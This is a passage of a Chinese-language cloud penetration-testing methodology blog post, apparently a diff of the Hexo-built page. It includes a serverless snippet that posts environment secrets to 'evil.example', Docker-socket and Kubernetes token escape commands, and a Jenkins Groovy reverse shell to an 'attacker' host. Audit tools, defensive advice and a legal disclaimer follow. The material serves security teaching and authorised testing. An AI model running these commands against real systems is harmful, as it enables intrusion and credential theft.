class="string">&quot;DB&quot;</span>])&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(<span class="string">&quot;https://evil.example/collect&quot;</span>, json=&#123;<span class="string">&quot;env&quot;</span>: secrets&#125;, timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;statusCode&quot;</span>: <span class="number">200</span>, <span class="string">&quot;body&quot;</span>: <span class="string">&quot;ok&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-容器与-ECS-逃逸"><a href="#5-2-容器与-ECS-逃逸" class="headerlink" title="5.2 容器与 ECS 逃逸"></a>5.2 容器与 ECS 逃逸</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测 Docker Socket 挂载</span></span><br><span class="line"><span class="built_in">ls</span> -la /var/run/docker.sock</span><br><span class="line"></span><br><span class="line"><span class="comment"># Docker Socket 利用逃逸</span></span><br><span class="line">docker -H unix:///var/run/docker.sock run -it --privileged \</span><br><span class="line">    -v /:/host alpine <span class="built_in">chroot</span> /host bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Kubenetes Service Account 令牌利用</span></span><br><span class="line"><span class="built_in">cat</span> /var/run/secrets/kubernetes.io/serviceaccount/token</span><br><span class="line">kubectl --token=$(<span class="built_in">cat</span> /var/run/secrets/kubernetes.io/serviceaccount/token) \</span><br><span class="line">    --server=https://kubernetes.default.svc --insecure-skip-tls-verify \</span><br><span class="line">    get pods --all-namespaces</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-CI-CD-流水线与-IaC-安全"><a href="#6-CI-CD-流水线与-IaC-安全" class="headerlink" title="6. CI&#x2F;CD 流水线与 IaC 安全"></a>6. CI&#x2F;CD 流水线与 IaC 安全</h2><h3 id="6-1-CI-CD-管道攻击链"><a href="#6-1-CI-CD-管道攻击链" class="headerlink" title="6.1 CI&#x2F;CD 管道攻击链"></a>6.1 CI&#x2F;CD 管道攻击链</h3><p>GitHub Actions、GitLab CI、Jenkins 是高价值目标：</p>
+<ul>
+<li><strong>公开仓库 Workflow 审查</strong> —— <code>.github/workflows/</code> 中可能泄露内部服务地址</li>
+<li><strong>PR 触发 CI</strong> —— fork 仓库触发 CI 可能暴露 Secrets 给外部代码</li>
+<li><strong>Jenkins 未授权</strong> —— <code>/script</code> 端点执行 Groovy 获取 Shell</li>
+</ul>
+<p><strong>Jenkins Groovy 反弹 Shell：</strong></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> sout = <span class="keyword">new</span> StringBuilder(), serr = <span class="keyword">new</span> StringBuilder()</span><br><span class="line"><span class="keyword">def</span> proc = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1&#x27;&quot;</span>.execute()</span><br><span class="line">proc.consumeProcessOutput(sout, serr)</span><br><span class="line">proc.waitForOrKill(<span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-Terraform-状态文件风险"><a href="#6-2-Terraform-状态文件风险" class="headerlink" title="6.2 Terraform 状态文件风险"></a>6.2 Terraform 状态文件风险</h3><p><code>terraform.tfstate</code> 常含明文密钥、数据库密码。常见泄露途径：</p>
+<ul>
+<li>将 <code>.tfstate</code> 提交到公开 Git 仓库</li>
+<li>S3 后端桶公开可读</li>
+<li>CI&#x2F;CD 日志打印状态文件内容</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;resources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aws_db_instance&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;instances&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;attributes&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SuperSecretDBPass123!&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rds-target.us-east-1.amazonaws.com&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GitHub 搜索: filename:terraform.tfstate NOT &quot;example&quot;</span></span><br><span class="line">trufflehog git https://github.com/target/repo.git --json</span><br><span class="line">tfsec .                            <span class="comment"># Terraform 静态安全扫描</span></span><br><span class="line">checkov -d ./terraform/            <span class="comment"># IaC 合规扫描</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="7-核心安全工具"><a href="#7-核心安全工具" class="headerlink" title="7. 核心安全工具"></a>7. 核心安全工具</h2><h3 id="7-1-ScoutSuite-——-多云安全审计（NCC-Group）"><a href="#7-1-ScoutSuite-——-多云安全审计（NCC-Group）" class="headerlink" title="7.1 ScoutSuite —— 多云安全审计（NCC Group）"></a>7.1 ScoutSuite —— 多云安全审计（NCC Group）</h3><p>支持 AWS、Azure、GCP、阿里云、Oracle Cloud，输出 HTML 报告：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install scoutsuite</span><br><span class="line">scout aws --access-key-id AKIA... --secret-access-key ... --report-name aws-report</span><br><span class="line">scout azure --cli --report-name azure-report</span><br><span class="line">scout gcp --user-account --report-name gcp-report</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-Prowler-——-AWS-安全评估与合规"><a href="#7-2-Prowler-——-AWS-安全评估与合规" class="headerlink" title="7.2 Prowler —— AWS 安全评估与合规"></a>7.2 Prowler —— AWS 安全评估与合规</h3><p>覆盖 CIS Benchmark、GDPR、HIPAA、PCI-DSS 等合规框架：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install prowler</span><br><span class="line">prowler aws --compliance cis_1.5_aws</span><br><span class="line">prowler aws --services s3 ec2 rds</span><br><span class="line">prowler aws --output-formats html</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键检查项：</strong> <code>s3_bucket_public_access</code>、<code>iam_root_user_no_access_keys</code>、<code>cloudtrail_multi_region_enabled</code>、<code>rds_instance_no_public_access</code>。</p>
+<h3 id="7-3-工具矩阵"><a href="#7-3-工具矩阵" class="headerlink" title="7.3 工具矩阵"></a>7.3 工具矩阵</h3><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>覆盖范围</th>
+<th>核心能力</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>cloudlist</strong></td>
+<td>多云</td>
+<td>资产发现与聚合</td>
+</tr>
+<tr>
+<td><strong>ScoutSuite</strong></td>
+<td>AWS&#x2F;Azure&#x2F;GCP&#x2F;阿里云</td>
+<td>安全审计与合规报告</td>
+</tr>
+<tr>
+<td><strong>Prowler</strong></td>
+<td>AWS</td>
+<td>CIS 合规 + 安全检查</td>
+</tr>
+<tr>
+<td><strong>Pacu</strong></td>
+<td>AWS</td>
+<td>渗透测试框架与利用</td>
+</tr>
+<tr>
+<td><strong>pmapper</strong></td>
+<td>AWS</td>
+<td>IAM 权限图分析与提权路径</td>
+</tr>
+<tr>
+<td><strong>s3scanner</strong></td>
+<td>AWS</td>
+<td>S3 桶枚举与权限探测</td>
+</tr>
+<tr>
+<td><strong>enumerate-iam</strong></td>
+<td>多云</td>
+<td>API 权限模糊测试</td>
+</tr>
+<tr>
+<td><strong>tfsec</strong></td>
+<td>Terraform</td>
+<td>IaC 静态安全扫描</td>
+</tr>
+<tr>
+<td><strong>checkov</strong></td>
+<td>Terraform&#x2F;CF&#x2F;K8s</td>
+<td>IaC 合规检查</td>
+</tr>
+<tr>
+<td><strong>trufflehog</strong></td>
+<td>通用</td>
+<td>Git 密钥扫描</td>
+</tr>
+</tbody></table>
+<h2 id="8-综合测试流程"><a href="#8-综合测试流程" class="headerlink" title="8. 综合测试流程"></a>8. 综合测试流程</h2><pre class="mermaid">flowchart LR
+    subgraph 侦察
+        R1[cloudlist] --> R2[DNS/crt.sh] --> R3[目标清单]
+    end
+    subgraph 存储
+        S1[桶爆破] --> S2[ACL审计]
+    end
+    subgraph IAM
+        I1[权限枚举] --> I2[pmapper] --> I3[提权路径]
+    end
+    subgraph 计算
+        C1[Serverless] --> C2[容器/元数据]
+    end
+    subgraph CI/CD
+        P1[State文件] --> P2[密钥扫描]
+    end
+    R3 --> S1
+    R3 --> I1
+    I3 --> C1
+    S2 --> C1
+    C2 --> P1</pre>
+
+<p><strong>标准测试步骤：</strong></p>
+<ol>
+<li><strong>资产测绘</strong> —— cloudlist + crt.sh + DNS 暴力破解确定范围</li>
+<li><strong>存储桶测试</strong> —— s3scanner 批量枚举 + 手动验证 ACL 与策略</li>
+<li><strong>IAM 分析</strong> —— enumerate-iam → pmapper 权限图 → 提权路径识别</li>
+<li><strong>计算层攻击</strong> —— SSRF → 元数据利用 → 凭证获取 → 横向移动</li>
+<li><strong>CI&#x2F;CD 审计</strong> —— 审查 Workflow → 扫描 Terraform State → 密钥检测</li>
+<li><strong>合规检查</strong> —— Prowler CIS 基准 + ScoutSuite 审计报告</li>
+<li><strong>报告与修复</strong> —— 按严重程度排序输出发现与修复建议</li>
+</ol>
+<h2 id="9-防御建议"><a href="#9-防御建议" class="headerlink" title="9. 防御建议"></a>9. 防御建议</h2><ul>
+<li><strong>启用 IMDSv2</strong>，禁用 IMDSv1 防止无认证元数据访问</li>
+<li><strong>实施最小权限原则</strong>，定期用 pmapper 审查 IAM 权限链</li>
+<li><strong>S3 Block Public Access</strong> 账户级全局启用</li>
+<li><strong>SCP</strong> 限制 <code>iam:PassRole</code> 等危险权限使用范围</li>
+<li><strong>Terraform State 远程加密存储</strong>，S3 后端不公开</li>
+<li><strong>CI&#x2F;CD 密钥使用 Secrets 管理器</strong>，禁止环境变量明文传递</li>
+<li><strong>启用 CloudTrail &#x2F; OSS 访问日志</strong> 输出至安全账号集中分析</li>
+</ul>
+<h2 id="10-免责声明"><a href="#10-免责声明" class="headerlink" title="10. 免责声明"></a>10. 免责声明</h2><blockquote>
+<p><strong>声明：</strong> 本文所述技术仅供安全研究、授权渗透测试和安全评估使用。任何未经授权对他人系统进行的测试或攻击行为均属违法，违反《中华人民共和国网络安全法》《中华人民共和国数据安全法》及《刑法》第 285 条、第 286 条相关规定。作者不对读者因滥用本文内容而导致的任何法律后果承担责任。在使用本文方法前，请确保已获得目标系统所有者的明确书面授权。</p>
+</blockquote>
+<hr>
+<p><em>本文首发于个人博客，转载请注明出处。</em></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" rel="tag"># 云安全</a>
+              <a href="/tags/%E6%96%B9%E6%B3%95%E8%AE%BA/" rel="tag"># 方法论</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/LFI-log-poisoning-session/" rel="prev" title="文件包含漏洞：日志注入与Session包含">
+                  <i class="fa fa-angle-left"></i> 文件包含漏洞：日志注入与Session包含
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Framework-ThinkPHP-RCE/" rel="next" title="ThinkPHP RCE 漏洞链">
+                  ThinkPHP RCE 漏洞链 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
